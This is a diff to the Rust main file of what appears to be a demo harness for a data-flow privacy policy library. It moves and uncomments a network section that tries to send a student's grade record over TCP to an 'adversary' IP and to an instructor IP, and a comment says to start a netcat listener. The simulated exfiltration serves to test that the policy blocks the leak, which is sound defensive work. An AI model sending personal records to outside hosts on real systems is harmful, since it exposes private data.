@@ -102,57 +102,6 @@ fn main() {
         Err(e) => { println!("Uh oh! {:?}", e); }
     }
     drop(bw_malte);
-    /*************************
-        NETWORK CONNECTIONS
-    **************************/
-
-    /*
-    // Note: On your local computer, run the following command: nc -l 5000 to open a listening socket
-    // Currently, if any of the sockets are not listening, the thread panics since the TCP connection failed
-    // TODO: change code so that it doesn't panic
-    
-    let net_ctxt_sreshtaa = filter::RemoteConnectContext {
-        remote_ip_address: self_ip_addr.clone(), 
-        port: 5000, 
-    };
-
-    let net_ctxt_adversary = filter::RemoteConnectContext {
-        remote_ip_address: adversary_ip_addr.clone(), 
-        port: 5000,
-    };  
-
-    let net_ctxt_instructor = filter::RemoteConnectContext {
-        remote_ip_address: instructor_ip_addr.clone(), 
-        port: 5000,
-    };  
-
-    // Self Ip Address
-    // let mut sreshtaa_stream = net::TcpStream::connect(((&net_ctxt_sreshtaa).remote_ip_address, (&net_ctxt_sreshtaa).port)).unwrap();
-    // let mut bw_tcp_sreshtaa = beaverio::BeaverBufWriter::safe_create(sreshtaa_stream, filter::Context::ClientNetwork(net_ctxt_sreshtaa));
-
-    // match bw_tcp_sreshtaa.safe_write_json(&sreshtaa_student_id) {
-    //     Ok(s) => { println!("Sent Sreshtaa's grade to Ip Address: {:?}", &self_ip_addr); },
-    //     Err(e) => { println!("Uh oh! Could not send Sreshtaa's grade over the network: {:?}", e); }
-    // }
-
-    // Random Ip Address
-    let mut adv_stream = net::TcpStream::connect(((&net_ctxt_adversary).remote_ip_address, (&net_ctxt_adversary).port)).unwrap();
-    let mut bw_tcp_adv = beaverio::BeaverBufWriter::safe_create(adv_stream, filter::Context::ClientNetwork(net_ctxt_adversary));
-
-    match bw_tcp_adv.safe_write_json(&sreshtaa_student_id) {
-        Ok(s) => { println!("Oh no! Incorrectly sent Sreshtaa's grade to adversary's Ip Address: {:?}", &adversary_ip_addr); },
-        Err(e) => { println!("Successfully prevented sending Sreshtaa's grade to Ip Address {:?}: {:?}", &adversary_ip_addr, e); }
-    }
-
-    // Instructor's Ip Address
-    let mut instructor_stream = net::TcpStream::connect(((&net_ctxt_instructor).remote_ip_address, (&net_ctxt_instructor).port)).unwrap();
-    let mut bw_tcp_instructor = beaverio::BeaverBufWriter::safe_create(instructor_stream, filter::Context::ClientNetwork(net_ctxt_instructor));
-
-    match bw_tcp_instructor.safe_write_json(&sreshtaa_student_id) {
-        Ok(s) => { println!("Sent Sreshtaa's grades to instructor's Ip Address: {:?}", &instructor_ip_addr); },
-        Err(e) => { println!("Uh oh! Could not send Sreshtaa's grade over the network: {:?}", e); }
-    }
-    */
 
     /*************************
         DESERIALIZING DATA
@@ -176,4 +125,40 @@ fn main() {
         Ok(s) => { println!("Uh oh! {:?}", s); },
         Err(e) => { println!("Successfully deserialized, checked policy on Malte's data and prevented write: {:?}", e); }
     }
+
+    /*************************
+        NETWORK CONNECTIONS
+    **************************/
+
+    // Note: On your local computer, run the following command: nc -l 5000 to open a listening socket
+    // Currently, if any of the sockets are not listening, the thread panics since the TCP connection failed
+
+    let net_ctxt_adversary = filter::RemoteConnectContext {
+        remote_ip_address: adversary_ip_addr.clone(), 
+        port: 5000,
+    };  
+
+    let net_ctxt_instructor = filter::RemoteConnectContext {
+        remote_ip_address: instructor_ip_addr.clone(), 
+        port: 5000,
+    };  
+
+    // Random Ip Address
+    let mut adv_stream = net::TcpStream::connect(((&net_ctxt_adversary).remote_ip_address, (&net_ctxt_adversary).port)).unwrap();
+    let mut bw_tcp_adv = beaverio::BeaverBufWriter::safe_create(adv_stream, filter::Context::ClientNetwork(net_ctxt_adversary));
+
+    match bw_tcp_adv.safe_write_json(&sreshtaa_student_id) {
+        Ok(s) => { println!("Oh no! Incorrectly sent Sreshtaa's grade to adversary's Ip Address: {:?}", &adversary_ip_addr); },
+        Err(e) => { println!("Successfully prevented sending Sreshtaa's grade to Ip Address {:?}: {:?}", &adversary_ip_addr, e); }
+    }
+
+    // Instructor's Ip Address
+    let mut instructor_stream = net::TcpStream::connect(((&net_ctxt_instructor).remote_ip_address, (&net_ctxt_instructor).port)).unwrap();
+    let mut bw_tcp_instructor = beaverio::BeaverBufWriter::safe_create(instructor_stream, filter::Context::ClientNetwork(net_ctxt_instructor));
+
+    match bw_tcp_instructor.safe_write_json(&sreshtaa_student_id) {
+        Ok(s) => { println!("Sent Sreshtaa's grades to instructor's Ip Address: {:?}", &instructor_ip_addr); },
+        Err(e) => { println!("Uh oh! Could not send Sreshtaa's grade over the network: {:?}", e); }
+    }
+
 }
